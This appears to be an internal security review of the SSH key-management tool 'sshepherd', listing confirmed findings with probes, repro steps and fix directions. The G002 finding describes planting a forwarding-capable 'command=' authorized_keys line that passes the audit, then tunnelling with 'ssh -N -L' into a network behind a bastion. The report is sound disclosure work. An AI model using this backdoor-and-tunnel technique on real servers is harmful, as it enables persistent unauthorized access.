- **Owner decision:** yes: the spec (S7 table) and README say a revoke's apply phase refuses clashed servers; should a removal-only write on a clashed server proceed as it does for a weak-key server (OP4), or keep refusing and only fix the misleading hints?

**Evidence** (verbatim from the finding):

~~~~text
Probe TestL05ProbeClashBlocksRevokeRemoval (hermetic sshtest, worktree at 9722c42). Manifest: op operator; deploy granted s1 twice: {user: deploy, servers: [s1], options: [no-pty]} and {user: deploy, servers: ["*"]}; eve granted s1. File on s1: op, 'no-pty deploy', eve (so dropping eve is removal-only). `revoke eve --yes --sweep` -> exit 2; stdout: 's1 (app@127.0.0.1:50722)  REFUSED: user "deploy": server "s1" is granted by access[0] with [no-pty] and by access[1] with no options; ...' / 'Summary: 0/1 servers converged · 1 refused  → exit 1' / 'manifest updated; 1 server not converged — finish with: sshepherd apply ... --server s1' / 'REVOKED KEY STILL INSTALLED: eve SHA256:zbv/... on s1 — run 'sshepherd apply ... --server s1''. Without --sweep revoke exits 1. File after: eve's line still present. The suggested `apply --yes` then: 's1 ... REFUSED: user "deploy" ...' exit 1. Contrast probe TestL05ProbeWeakDoesNotBlockRevokeRemoval (same shape, deploy holds an RSA-1024 key instead of a clash): revoke eve -> 's1: applied · verified', exit 0, eve removed. Code: serial.go:160 `if msgs == "" || (removalOnly(r, entries) && len(r.Diff.Unauthorized) > 0) { return "" }` exists for weak keys ('without it an unrelated revoke would save but leave the revoked key installed', OP4); restrictionRefusal (serial.go:149) has no such exception and planOne returns it at plan.go:282 before anything else.
~~~~

**Repro:**

~~~~text
In a worktree: a cmd/sshepherd test using sshtest.NewServer + run(): manifest above, pre-written authorized_keys with op, 'no-pty <deploy>', <eve>; run `revoke eve --yes` (exit 1, eve still installed) and `revoke eve --yes --sweep` (exit 2, hint names `apply --server s1`, which refuses). Same with `revoke --key <eve fp>` and `revoke eve --from-server s1`.
~~~~

**Impact:** Offboarding: any restriction\_conflict about any other user on a server (OP6 says a clash can arise 'at a distance' by adding a tag or putting an operator in a restricted group) silently pins every leaver's now-revoked key on that server. The leaver's revoke saves, bumps the serial and exits 1 (2 only with --sweep), and both follow-up hints ('finish with: sshepherd apply --server s1', sweep's 'run sshepherd apply --server s1') name a command that refuses the same server, so the operator is pointed in a loop until someone fixes an unrelated user's grants. The weak-key policy conflict was given exactly this exception (OP4) for this reason; the restriction conflict was not, though a removal-only write cannot install or change the clashed user's line (removalOnly requires every kept key's options to equal what is installed).

**Fix direction:** Give restrictionRefusal the same removal-only escape as weakRefusal (refuse only when the write is not removalOnly or removes nothing), or at least make revoke/sweep say that the revoked key stays until the clash is fixed and stop classing a clashed server as 'fixable' by apply. Add a hermetic test: unrelated clash + revoke of another user removes the key.

**Gap-round check K8-3** (medium, CONFIRMED): F005 split vote settled at medium plus an owner question: the behavior reproduces and follows the approved S7 design, so it is not high; what remains is an unconsidered removal-only sub-case and a follow-up hint that loops

~~~~text
Probe TestK8F005 (cmd/sshepherd, existing clashPushFleet: deploy granted web-1 by access[1] [no-pty] and access[2] plain; bob granted web-1): 'revoke exit=1' / 'web-1 (...)  REFUSED: user "deploy": server "web-1" is granted by access[1] with [no-pty] and by access[2] with no options; ...' / 'Summary: 0/1 servers converged · 1 refused  → exit 1' / 'manifest updated; 1 server not converged — finish with: sshepherd apply ... --server web-1'; then 'follow-up apply exit=1' with the same REFUSED row; then 'audit exit=2' with 'bob (REVOKED 2026-11-10) ... installed but REVOKED (CRITICAL: revoked key)'. The design accepts this: plan p10-s7-restrictions.md:27 'Unlike a weak-key refusal there is no removal-only exception: the Risks bullet holds the server for "other users' revocations included"', the ServerPlan comment at plan.go:122, and TestRevokeSweepOverRestrictionClash pins exit 2 under --sweep. All three verifiers reproduced it (correctness 'REFUTED' means 'by design', not 'did not happen'). The reproduce verifier found that the removal-only sub-case (deploy's line already installed as 'no-pty KEY', so dropping bob cannot change deploy's line) was never tested or discussed. The P09 spec built the weak-key removal-only exception (serial.go:160) for exactly this offboarding case.
~~~~

Owner question from K8-3: yes: should a restriction clash keep holding a server for a removal-only revoke of another user (keep the S7 rule and only fix the hint), or get the same removal-only exception weak keys have?

<details><summary>Verifier evidence (verbatim)</summary>

**correctness** (REFUTED, sev low):

~~~~text
internal/apply/plan.go:280-283 restrictionRefusal is checked before entries exist (no removal-only escape). serial.go:146-148 comment: 'planOne marks it ClashRefused, so it never withholds a revoke's or rotate's save.' Spec docs/superpowers/specs/2026-11-08-access-model-fleet-reach-design.md:100 OP6 '(2) (owner override): ... apply refuses those servers, validate and the saving commands that would add a clash refuse, revoke and rotate still save.' Spec line 174: 'Restriction clash ... `revoke` and `rotate` still save, and their apply phase exits as `apply` does'. S7 command table: '`revoke`, `rotate` | **Still save,** ... Their apply phase refuses the clashed servers as `apply` does'. audit-trust-posture spec:683 'The removal-only exception of section 5 is for `weak_key` alone'. The existing test cmd/sshepherd/restrict_save_test.go TestRevokeSweepOverRestrictionClash says 'the leaver's key stays on the server the clash holds, so --sweep finds it there: exit 2' and PASSES (go test -run 'TestRevokeSweepOverRestrictionClash|TestRevokeSavesOverRestrictionClash' -> ok). Probe in my worktree (clashPushFleet, then revoke bob --sweep --yes, then apply --yes --server web-1): revoke exit=2, 'web-1 ... REFUSED: user "deploy": server "web-1" is granted by access[1] with [no-pty] and by access[2] with no options; a key gets one set of restrictions on a server: make them match, or move one grant to a separate user', 'manifest updated; 1 server not converged — finish with: sshepherd apply ... --server web-1', 'REVOKED KEY STILL INSTALLED: bob SHA256:zbv/... on web-1 — run ...apply... --server web-1'. apply exit=1 with the same REFUSED row. This matches the spec. The finish hint is generic in editrun.go finishEdit, for any plan not converged and not emptied.
~~~~

Why refuted: The observed behavior is real (my probe reproduces it), but it is the specified, owner-decided and test-pinned behavior, not a defect. OP6 (owner override) reads: 'apply refuses those servers ... revoke and rotate still save'. The S7 exit table says 'revoke and rotate still save, and their apply phase exits as apply does', and the S7 command table says 'revoke, rotate: Still save ... Their apply phase refuses the clashed servers as apply does'. S7 Mechanics compares ClashRefused with WeakRefused on purpose and copies only the save-neutral part (NothingCanLand skips it). The weak-key removal-only exception is scoped in the audit-trust spec: 'The removal-only exception of section 5 is for weak\_key alone'. The existing test TestRevokeSweepOverRestrictionClash (cmd/sshepherd/restrict\_save\_test.go:93-95) pins this exact scenario: 'the leaver's key stays on the server the clash holds, so --sweep finds it there: exit 2'. Exit codes follow D28: revoke without --sweep exits 1 for a server that did not converge (the same as an unreachable one) and prints 'check every server: sshepherd audit', and that audit exits 2 on the REVOKED key. With --sweep it exits 2. So the security state is surfaced and not silent. The hint claim is also weak. 'finish with: sshepherd apply --server S' (editrun.go:619-629) and sweep's 'run apply' (sweep.go:167-172, which classes a server by DesiredFor emptiness alone) are generic for every non-converged server: revoked-kind conflicts, weak refusals, unparseable lines and symlink refusals get the same hint. The REFUSED row printed just above them names the fix ('make them match, or move one grant to a separate user'), and apply is the right command once that fix is made, so there is no loop. Changing the behavior is a design request for the owner (the finding already marks needs\_owner\_decision). At most a low-severity hint wording improvement remains.

**reproduce** (reproduced, sev medium):

~~~~text
Probe TestF005Probe (cmd/sshepherd, editFleet hermetic sshtest; file: alice, 'no-pty deploy', bob). Output: 'sweep=false revoke exit=1' / 'web-1 (deploy@127.0.0.1:62998)  REFUSED: user "deploy": server "web-1" is granted by access[1] with [no-pty] and by access[2] with no options; ...' / 'Summary: 0/1 servers converged · 1 refused  → exit 1' / 'manifest updated; 1 server not converged — finish with: sshepherd apply ... --server web-1' / 'bob still installed: true' / 'follow-up apply exit=1' (same REFUSED) / 'bob still installed after apply: true'. 'sweep=true revoke exit=2' / 'REVOKED KEY STILL INSTALLED: bob SHA256:zbv/... on web-1 — run sshepherd apply ... --server web-1' / follow-up apply exit=1, bob still installed. Code: internal/apply/serial.go:160 `if msgs == "" || (removalOnly(r, entries) && len(r.Diff.Unauthorized) > 0) { return "" }` (weak only); serial.go:149-151 restrictionRefusal has no such check; plan.go:282-285 returns ClassRefused before desiredEntries. Design docs: spec 2026-11-08-access-model-fleet-reach-design.md S7 table row '`revoke`, `rotate` | Still save ... Their apply phase refuses the clashed servers as `apply` does'; README.md:2272 'their apply phase refuses those servers (exit `1`)'; existing test restrict_save_test.go:92-95 'the leaver's key stays on the server the clash holds, so --sweep finds it there: exit 2'. P09 spec audit-trust-posture-design.md:683 'The removal-only exception of section 5 is for `weak_key` alone' (written before S7).
~~~~

**security** (reproduced, sev low):

~~~~text
Probe in worktree (clashPushFleet: alice, deploy granted web-1 twice [no-pty]/none, bob; revoke bob --sweep --yes): exit 2; stdout 'web-1 (...) REFUSED: user "deploy": server "web-1" is granted by access[1] with [no-pty] and by access[2] with no options; a key gets one set of restrictions on a server: make them match, or move one grant to a separate user' / 'Summary: 0/1 servers converged · 1 refused → exit 1' / 'manifest updated; 1 server not converged — finish with: sshepherd apply ... --server web-1' / 'REVOKED KEY STILL INSTALLED: bob SHA256:zbv/... on web-1 — run 'sshepherd apply ... --server web-1''. Then apply --yes --server web-1: exit 1, same REFUSED row. internal/apply/plan.go:278-281 restrictionRefusal before entries; serial.go:160 weak-only removalOnly escape. Design: spec :1419-1420, plan p10-s7 :27 and :1808 'no removal-only exception: the server is held even for a revoke', test restrict_save_test.go:92-109.
~~~~

</details>

#### F006 [high] README's unattended container recipes cannot land a key removal: a read-only manifest makes apply exit 3, and a writable copy whose serial bump is never committed wedges the server

- **Status:** CONFIRMED
- **Lens(es):** container (raw ids: L10-1)
- **Location:** README.md:3106-3108 (Kubernetes CronJob recipe), README.md:3094-3102 (config volume readOnly / configMap), cmd/sshepherd/apply.go:167-191 (commit -> saveSerialBump)
- **Verifier votes:** correctness: reproduced (sev medium) | reproduce: reproduced (sev medium) | security: reproduced (sev medium)
- **Owner decision:** yes: for an unattended apply from a read-only or ephemeral manifest, should apply (a) warn and write without the bump as for a piped --config, (b) refuse unless a flag acknowledges the missing bump, or (c) stay as is with recipes rewritten to require committing the bump back (serial pre-bumped in the git change)?

**Evidence** (verbatim from the finding):

~~~~text
README.md:3106: "`apply` writes nothing to the local filesystem, so `readOnlyRootFilesystem` is safe here; `revoke`/`rotate` edit the manifest, so mount it from a writable volume for those." The CronJob mounts the manifest from `configMap: {name: sshepherd-config}` with `readOnly: true`. But apply.go:167 commit() calls saveSerialBump whenever apply.NeedsSerialBump (D4b: any removal), and a failed save is exit 3 with nothing written. Probe (built image sshepherd:review-l10, throwaway sshd container with deploy's authorized_keys = ci + bob, manifest grants only operator ci; hardened run, manifest dir mounted :ro as the CronJob does): `docker run --rm --network l10-net --read-only --cap-drop ALL --security-opt no-new-privileges -v $W/cfg:/config:ro -v $W/ci:/secrets/ci:ro sshepherd:review-l10 apply --yes --config /config/sshepherd.yaml --known-hosts /config/known_hosts --identity /secrets/ci` -> `-  (unknown) "bob" ... remove (unauthorized)` ... `error: lock manifest: open /config/.sshepherd.yaml.sshepherd-lock: read-only file system` exit=3; the server file still holds both keys afterwards. Second probe, a writable per-run copy of the git manifest (emptyDir / CI-checkout shape): run 1 `manifest serial: 0 → 1 (saved; this apply removes keys)` exit 0, server header `(serial 1)`; run 2 from a fresh copy of git (carol added, serial line never committed): `box ... REFUSED: written by manifest serial 1, this manifest is 0 — a newer manifest revoked or rotated keys here; pull the latest manifest, or if you are sure, set serial: 1` exit=1, carol not installed.
~~~~

**Repro:**

~~~~text
Build the image; start an sshd container with deploy's authorized_keys = operator key + an extra key; manifest grants only the operator; run the README CronJob shape (manifest dir mounted read-only) with apply --yes: exit 3, extra key stays. Then mount a writable copy: run once (bump 0->1 saved only in the copy), recopy the git manifest with a new grant, run again: REFUSED exit 1.
~~~~

**Impact:** The documented headless deployment (K8s CronJob with a configMap manifest) can never remove a key: offboarding by deleting a user in git fails every run with exit 3 and the revoked user's key stays installed. Following the obvious workaround (a writable per-run copy, or the GitHub Actions/GitLab recipes which run from a CI checkout) saves the bump only in an ephemeral copy, so the next run from git is refused on every server that removal touched (exit 1) and no later grant lands there until a human commits `serial: N`. The README text promising read-only safety for apply contradicts its own Serial bump section ("A failed save exits 3 with nothing written").

**Fix direction:** Decide how a headless/GitOps apply handles D4b (e.g. treat a non-writable manifest like a piped --config and warn, an explicit flag to skip or require the bump, or document that the bump must be committed back / pre-bumped in the offboarding PR), then make the CronJob and CI recipes match and add a test or E2E that runs apply --yes removal against a read-only manifest.

<details><summary>Verifier evidence (verbatim)</summary>

**correctness** (reproduced, sev medium):

~~~~text
Probe test in my worktree (cmd/sshepherd/zz_f006_probe_test.go, hermeticFleet plus a stray 'bob' key, manifest dir chmod 0555): `apply --yes` -> stdout plans `- (unknown) "bob" ... remove (unauthorized)`; stderr `error: lock manifest: open .../001/.sshepherd.yaml.sshepherd-lock: permission denied`; RO exit=3; server file still has bob: true. Ephemeral copy: run1 `manifest serial: 0 → 1 (saved; this apply removes keys)` exit 0. Run2 from the original serial-0 bytes plus a new key for alice gives `web-1 ... REFUSED: written by manifest serial 1, this manifest is 0 — ... pull the latest manifest, or if you are sure, set serial: 1` exit=1, and the new key is not installed. Code: cmd/sshepherd/apply.go commit() -> `to, err := saveSerialBump(pa.m)`; only errNoSerialSave (a pipe or anchors) degrades to a warning, and any other error is returned (exit 3). internal/apply/serialbump.go:28 `if p.Class == ClassChange && len(p.Remove) > 0 && m <= s { return true }`. README.md:3095 `- {name: config, mountPath: /config, readOnly: true}`, :3101 `configMap: {name: sshepherd-config}`, :3106-3108 `apply writes nothing to the local filesystem, so readOnlyRootFilesystem is safe here; revoke/rotate edit the manifest, so mount it from a writable volume for those.` These contradict README.md:2385-2397 (Serial bump: 'A failed save exits 3 with nothing written'). Spec docs/superpowers/specs/2026-11-08-revocation-memory-design.md section 6: 'a failed save is exit 3 with nothing written'. git log -S dates the README sentence to a8e2257 (2026-11-07), before W4.
~~~~

**reproduce** (reproduced, sev medium):

~~~~text
Probe cmd/sshepherd/zz_f006_probe_test.go in worktree OUT/wt/v-F006-reproduce (hermeticFleet with an extra 'offboarded' key on the server), GOTOOLCHAIN=go1.27.3 go test ./cmd/sshepherd -run TestF006 -v. (1) Manifest file 0444 in a 0555 dir: plan shows '-  (unknown) "offboarded" ... remove (unauthorized)', then 'error: lock manifest: open .../.sshepherd.yaml.sshepherd-lock: permission denied', exit=3, server file unchanged (both keys still installed). (2) Writable copy: RUN1 'manifest serial: 0 -> 1 (saved; this apply removes keys)' exit=0, server header '(serial 1)'. Then the original git bytes plus a new user carol granted on web-1: RUN2 'web-1 ... REFUSED: written by manifest serial 1, this manifest is 0 - a newer manifest revoked or rotated keys here; ... set serial: 1 ...' exit=1, carol not installed. Code: cmd/sshepherd/apply.go:167-191 commit() -> saveSerialBump (only a pipe or anchors get errNoSerialSave). README.md:2393-2395: 'A failed save exits `3` with nothing written'. README.md:3106-3108 is the contradicting recipe text. Spec docs/superpowers/specs/2026-11-08-revocation-memory-design.md section 6 shows the bump and exit 3 are intended, so the defect is in the recipe docs and the headless policy, not in the code.
~~~~

**security** (reproduced, sev medium):

~~~~text
README.md:3106 "`apply` writes nothing to the local filesystem, so `readOnlyRootFilesystem` is safe here"; README.md:3095 "{name: config, mountPath: /config, readOnly: true}"; README.md:2396 "A failed save exits `3` with nothing written"; cmd/sshepherd/apply.go:175-183 (only errNoSerialSave from a Stream or UnsupportedError manifest warns and proceeds); internal/apply/serialbump.go:29 `if p.Class == ClassChange && len(p.Remove) > 0 && m <= s`. Probe (worktree test, go test -run TestProbeF006 -v): A) manifest dir chmod 0555, stray key installed: `apply --yes` -> 'error: lock manifest: open …/.sshepherd.yaml.sshepherd-lock: permission denied', exit=3, 'server unchanged=true stray still there=true'; the rerun also exits 3; `apply --dry-run` on the same read-only manifest prints 'would bump serial: 0 → 1 (this apply removes keys)' (exit 1). B) writable copy: run1 'manifest serial: 0 → 1 (saved; this apply removes keys)' exit 0, server header '(serial 1)'; unchanged git copy -> 'converged (no changes) note: written by newer manifest serial 1 (yours is 0)' exit 0; git copy plus a new key -> 'REFUSED: written by manifest serial 1, this manifest is 0 …' exit 1.
~~~~

</details>

#### G001 [high] YAML merge keys (&lt;&lt;:) pass the editor's unsupported-shape gate; revoke --from-server on a merged except: writes an overriding except: and grants the user every server it excluded

- **Status:** CONFIRMED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-1)
- **Location:** internal/manifest/manifest.go:150-175 (checkNodeShapes rejects anchors/aliases, not a !!merge key); internal/manifest/edit.go:392 (exceptServers: valueOf(entry, "except") sees only a literal key), edit.go:349 (trimEntry: valueOf(entry, "servers")), edit.go:96 (findKey: valueOf(u, "keys")), edit.go:39-41 (RemoveUser key count)
- **Verifier votes:** correctness: reproduced (sev high) | reproduce: reproduced (sev high) | security: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Manifest (binary built from 9722c42, probe dir m1): access entry `- user: carol\n  servers: ["*"]\n  <<: {except: [db-1]}`. `validate` exit 0. `revoke carol --from-server web-1 --no-apply --yes` printed `manifest edit: remove carol's access to web-1 (1 access entry changed, 1 server excepted); carol keeps access to 2 other servers — 2 servers affected` and `run 'sshepherd apply --server web-1 --server db-1' to push`, exit 0. Saved entry: `servers: ["*"]\n    except: [web-1]\n    !!merge <<: {except: [db-1]}`. config.Parse coverage probe: before `carol covers web-1=true web-2=true db-1=false`, after `carol covers web-1=false web-2=true db-1=true`. Other merge shapes fail closed but misleadingly: `<<: {servers: [web-1]}` -> RemoveAccess is a no-op `{EntriesChanged:0 ...}` and revoke exits 3 with `would keep 1 policy conflict`; `<<: {keys: [...]}` -> `revoke --key` exits 3 `edit manifest: key SHA256:... is not in the manifest`; RemoveUser reports `{Keys:0 ...}` for a user whose key rides the merge. Load accepted `users: [{<<: {name: a}, keys: [...]}]` (Load err = <nil>).
~~~~

**Repro:**

~~~~text
Write the manifest above (two users, servers web-1/web-2/db-1, carol's except: inside an inline `<<: {except: [db-1]}`); run `sshepherd revoke carol --from-server web-1 --no-apply --yes --config sshepherd.yaml`; `sshepherd apply --yes` then installs carol's key on db-1.
~~~~

**Impact:** A revoke (an access removal) silently grants the user access to servers the manifest explicitly excluded, and the follow-up apply (or the same run without --no-apply, under --yes) pushes the key there. The README promises such shapes are refused (`Anchors and aliases ... cannot be edited faithfully`). Precondition is an inline merge key without an anchor, which is unusual hand-written YAML, so realism is limited; the anchored form `<<: *x` is refused.

**Fix direction:** In checkNodeShapes, return UnsupportedError for any mapping key tagged !!merge (or valued `<<`), so Load refuses the whole merge-key class as it does anchors; add a FuzzRemoveAccess/FuzzManifestEdit seed with an inline merge key.

<details><summary>Verifier evidence (verbatim)</summary>

**correctness** (reproduced, sev high):

~~~~text
Probe manifest: carol `servers: ["*"]` + `<<: {except: [db-1]}`, servers web-1/web-2/db-1. `sshepherd validate` -> `manifest OK: 2 users, 3 servers, 5 grants`, exit 0. `sshepherd revoke carol --from-server web-1 --no-apply --yes` -> `manifest edit: remove carol's access to web-1 (1 access entry changed, 1 server excepted); carol keeps access to 2 other servers — 2 servers affected` ... `run 'sshepherd apply --server web-1 --server db-1' to push`, exit 0. diff: `<     <<: {except: [db-1]}` / `>     except: [web-1]` / `>     !!merge <<: {except: [db-1]}` (plus `serial: 1`). config.Parse probe test (Covers): before.yaml carol web-1=true web-2=true db-1=false; after carol web-1=false web-2=true db-1=true. manifest.go:150-153: `if n.Anchor != "" || n.Kind == yaml.AliasNode { return &UnsupportedError{...anchor or alias...}` with no !!merge check; README.md:2744 `**Anchors and aliases.** A manifest using YAML anchors/aliases ... cannot be edited faithfully`.
~~~~

**reproduce** (reproduced, sev high):

~~~~text
Binary built in worktree at 9722c42. Manifest access entry: '- user: carol / servers: ["*"] / <<: {except: [db-1]}'. `sshepherd validate --known-hosts /dev/null` -> 'manifest OK: 2 users, 3 servers, 5 grants (3 warnings)', exit 0. `sshepherd revoke carol --from-server web-1 --no-apply --yes` -> 'manifest edit: remove carol's access to web-1 (1 access entry changed, 1 server excepted); carol keeps access to 2 other servers — 2 servers affected' ... 'run 'sshepherd apply --server web-1 --server db-1' to push', exit 0. Saved: '    servers: ["*"]\n    except: [web-1]\n    !!merge <<: {except: [db-1]}'. Probe test (config.Parse + Covers/DesiredFor): before 'carol covers web-1=true keys=2, web-2=true keys=2, db-1=false keys=1'; after 'carol covers web-1=false keys=1, web-2=true keys=2, db-1=true keys=2'. Code: manifest.go checkNodeShapes only checks n.Anchor/AliasNode, key kind/null/empty; edit.go:392 'except := valueOf(entry, "except")'. README:2744 promises anchors/aliases are refused, says nothing about merge keys.
~~~~

**security** (reproduced, sev medium):

~~~~text
Binary built from 9722c42. Manifest access: `- user: carol / servers: ["*"] / <<: {except: [db-1]}`. `sshepherd validate` -> 'manifest OK: 2 users, 3 servers, 5 grants', exit=0. `sshepherd revoke carol --from-server web-1 --no-apply --yes` -> 'manifest edit: remove carol's access to web-1 (1 access entry changed, 1 server excepted); carol keeps access to 2 other servers — 2 servers affected' ... "run 'sshepherd apply --config m.yaml --server web-1 --server db-1' to push", exit=0. Saved: `servers: ["*"]\n    except: [web-1]\n    !!merge <<: {except: [db-1]}`. Probe test calling config.Parse + Covers/DesiredFor: before: carol covers web-1=true web-2=true db-1=false (db-1 keys=1); after: web-1=false web-2=true db-1=true (db-1 keys=2). manifest.go:151 checks only `n.Anchor != "" || n.Kind == yaml.AliasNode`; README.md:2744 'Anchors and aliases ... cannot be edited faithfully'.
~~~~

</details>

#### G002 [high] A command: preserve rule keeps a line with any other options: a stranger line copying the tool's command= but allowing port/agent/X11 forwarding, permitopen/permitlisten or tunnel= is kept, audit says compliant (exit 0), even on a bastion

- **Status:** CONFIRMED
- **Lens(es):** gap-preserve-external-keys (raw ids: K5-1)
- **Location:** internal/config/preserve\_match.go:10-20 (PreserveRuleFor matches only CommandOf(k.Options) or k.Comment); internal/audit/preserve.go:24-40 (externalLines/neverKept check owned, revoked, CertOnly only); README.md:598-599
- **Verifier votes:** correctness: reproduced (sev medium) | reproduce: reproduced (sev medium) | security: reproduced (sev medium)
- **Owner decision:** yes: should a preserve: rule keep only lines that cannot forward (refuse/flag otherwise), only flag forwarding-capable kept lines on bastions, or stay as is with a README warning?

**Evidence** (verbatim from the finding):

~~~~text
Probe TestK5Probe (internal/audit, own worktree) with rule command: '/usr/local/bin/gitea serv key-[0-9]+' on server gitea, which server inner reaches via: gitea. Output: line="command=\"/usr/local/bin/gitea serv key-1\",permitopen=\"db.internal:5432\",agent-forwarding,X11-forwarding,pty ssh-ed25519 ... stranger" external=1 unauthorized=0 compliant=true exit=0; same for 'command="/usr/local/bin/gitea serv key-1" <key> stranger' (no no-port-forwarding) and 'command="...key-1",tunnel="0",permitlisten="0.0.0.0:2222"'. README.md:599 says 'Prefer `command:` rules, which match what the line runs.'; neither README nor spec S6 mentions that command= does not stop `ssh -N -L/-R/-D` forwarding. README's own sample kept line (README.md:588) carries only no-pty.
~~~~

**Repro:**

~~~~text
Manifest: server gitea (user git) with preserve: [{command: '/usr/local/bin/gitea serv key-[0-9]+'}] and a second server with via: gitea. Someone who could write git's authorized_keys (an offboarded admin before revoke, a compromised tool) appends `command="/usr/local/bin/gitea serv key-1" ssh-ed25519 <own key> x`. sshepherd audit: exit 0, row 'externally managed (preserve: command)'; apply keeps the line; the planter runs `ssh -N -L 5432:db.internal:5432 git@gitea` and tunnels into the network behind the bastion (and picks key-1 to act as that Gitea user).
~~~~

**Impact:** preserve: is the one allow-list hole in 'the file holds exactly the manifest's keys'; a command: rule is presented as the safe kind, but it admits a persistent, revocation-surviving key with full TCP forwarding (and agent/X11/tun where sshd allows them) that audit grades compliant. On a bastion the kept line reopens exactly the network reach S5 guards.

**Fix direction:** Require kept lines to be forwarding-restricted (e.g. authkeys.Forwards false and no permitopen/permitlisten/tunnel/agent/X11 relaxations, or `restrict`), or grade a kept line that can forward as drift (critical on a server other servers are via:), and say in the README that command= does not stop forwarding; alternatively let a rule declare required options.

<details><summary>Verifier evidence (verbatim)</summary>

**correctness** (reproduced, sev medium):

~~~~text
Probe TestG002Probe (internal/audit, worktree at 9722c42), manifest: gitea (user git, preserve: [{command: '/usr/local/bin/gitea serv key-[0-9]+'}]), inner (via: gitea), alice granted both. Output (go test -run TestG002Probe -v):
planted="command=\"/usr/local/bin/gitea serv key-1\",permitopen=\"db.internal:5432\",agent-forwarding,X11-forwarding,pty ssh-ed25519 ... stranger" external=1 unauthorized=0 compliant=true exit=0
  ~  (unknown) "stranger"  SHA256:z/fS...  ssh-ed25519  externally managed (preserve: command) · options: "command=...,permitopen=\"db.internal:5432\",agent-forwarding,X11-forwarding,pty"
  Summary: 1/1 servers compliant · 0 with drift (0 critical) · 0 unreachable  → exit 0
planted="command=\"/usr/local/bin/gitea serv key-1\" ssh-ed25519 ... stranger" external=1 unauthorized=0 compliant=true exit=0
planted="command=...,tunnel=\"0\",permitlisten=\"0.0.0.0:2222\" ..." external=1 unauthorized=0 compliant=true exit=0
Code: internal/audit/preserve.go neverKept: `return owned || revoked || authkeys.CertOnly(k.Options)`; internal/config/preserve_match.go: `text, ok = authkeys.CommandOf(k.Options)` then `r.re.MatchString(text)`. Spec 2026-11-08 S6 'Lines that are never preserved' lists owned, tombstoned, CertOnly, unparseable only; S6 'Audit': 'Not drift (exit 0)'. README.md:598-599: 'Prefer `command:` rules, which match what the line runs.'
~~~~

**reproduce** (reproduced, sev medium):

~~~~text
Probe internal/audit/zz_g002_probe_test.go in worktree OUT/wt/v-G002-reproduce at 9722c42: manifest alice operator; servers gitea (user git, preserve: [{command: '/usr/local/bin/gitea serv key-[0-9]+'}]) and inner (via: gitea); gitea's file = managed header + alice + planted line with testkeys seed 7 comment 'stranger'. `GOTOOLCHAIN=go1.27.3 go test ./internal/audit -run TestG002Probe -v -count=1` output for each of three planted lines: 'external=1 unauthorized=0 compliant=true', 'exit=0', report rows: '~  (unknown) "stranger" ... externally managed (preserve: command) · options: "command=\"/usr/local/bin/gitea serv key-1\",permitopen=\"db.internal:5432\",agent-forwarding,X11-forwarding,pty"' / '... options: "command=\"/usr/local/bin/gitea serv key-1\""' / '... options: "command=\"/usr/local/bin/gitea serv key-1\",tunnel=\"0\",permitlisten=\"0.0.0.0:2222\""'; 'Summary: 2/2 servers compliant · 0 with drift (0 critical) · 0 unreachable  → exit 0'. (A first run with '(serial 1)' in the header gave exit 1 from serial-ahead drift only, unrelated.) Code: internal/audit/preserve.go:47 'return owned || revoked || authkeys.CertOnly(k.Options)'; internal/config/preserve_match.go:13-16 match only CommandOf(k.Options) or k.Comment. Spec 2026-11-08 S6 'Lines that are never preserved' lists owned, tombstoned, CertOnly, unparseable only. README.md:598-599 'Comment rules are weaker ... Prefer `command:` rules, which match what the line runs.'
~~~~

**security** (reproduced, sev medium):

~~~~text
Probe internal/audit/zz_probe_test.go in worktree wt/v-G002-security (manifest: gitea with preserve [{command: '/usr/local/bin/gitea serv key-[0-9]+'}], inner via: gitea; content = alice's key + one stranger line with seed 7):
  exit=0 external=1 unauthorized=0 compliant=true reasons=[] line=command="/usr/local/bin/gitea serv key-1",permitopen="db.internal:5432",agent-forwarding,X11-forwarding,pty ...
  exit=0 external=1 unauthorized=0 compliant=true reasons=[] line=command="/usr/local/bin/gitea serv key-1" ssh-ed25519 ...
  exit=0 external=1 unauthorized=0 compliant=true reasons=[] line=command="/usr/local/bin/gitea serv key-1",tunnel="0",permitlisten="0.0.0.0:2222" ...
internal/audit/preserve.go:44-48 neverKept: `return owned || revoked || authkeys.CertOnly(k.Options)`. Spec S6 'Lines that are never preserved' lists only owned, tombstoned, CertOnly, unparseable; spec 'External line kept by preserve: | 0'. README.md:597-598 'Comment rules are weaker... Prefer `command:` rules, which match what the line runs.' Existing TestExternalWeakKey already keeps a line with only command= (no restrictions).
~~~~

</details>

### 2.2 Medium (33)

#### F007 [medium] Bastion forwarding guard accepts 'any survivor forwards', but the hop logs in with the first key in OfferOrder, which ignores forwarding options; the forward probe tests only the first dependent

- **Status:** CONFIRMED
- **Lens(es):** ssh-crypto (raw ids: L01-2)
- **Location:** internal/apply/plan.go:664-700 (forwardRefusal, probeForwardFor); internal/authkeys/offer.go:14-25 (OfferRank)
- **Verifier votes:** single: reproduced (sev medium)
- **Owner decision:** yes: fix by (a) judging forwarding on the first survivor in OfferOrder, refusing otherwise, or (b) ordering a bastion's offer so forwarding-capable keys come first (changes OfferOrder, which D31 says is one order for every connection and the probe)?

**Evidence** (verbatim from the finding):

~~~~text
forwardRefusal returns "" as soon as one surviving key forwardsAll; OfferRank ranks permitopen=/no-port-forwarding as 0 (options.go:52,58 carry no blocksLogin), so a restricted line can be first in the production offer; probeForwardFor forwards only to deps[0]. Probe 1 (worktree, internal/apply): manifest op (operator, key 1, `permitopen="10.0.1.5:22"`) and ci (operator, key 2, plain), bastion-eu with web-1 (10.0.1.5) and web-2 (10.0.1.6) behind it, both keys held -> `RESULT bastion plan class=change refusal="" probeForward="10.0.1.5:22"`, `production offer order on bastion: first=... (key1=true)`, `probe offer first=key1? true`, `key1 rank=0 forwards web-1=true web-2=false`. Probe 2 (real OpenSSH_10.5p1 sshd on 127.0.0.1:22999, authorized_keys line 1 `permitopen="127.0.0.1:1" k1`, line 2 plain k2, Dialer through it as bastion to a via target): order [k1,k2] -> `RESULT err kind=dial hop="bastion" hint="the bastion refused the forward; allow TCP forwarding for this account" err=via bastion: forward to 127.0.0.1:22999 refused: ssh: rejected: administratively prohibited`; control order [k2,k1] -> `RESULT connected through bastion; target session key = ... (k2=true)`.
~~~~

**Repro:**

~~~~text
Hold two keys granted on a managed bastion; give the one DesiredFor lists first a permitopen= (via a per-grant `options:` or on the key line) naming only the bastion's first dependent; apply. The plan is a change, the guard passes, the post-write probe forwards to deps[0] and passes, the file is kept; the next audit/apply/revoke cannot reach the other dependents through the bastion.
~~~~

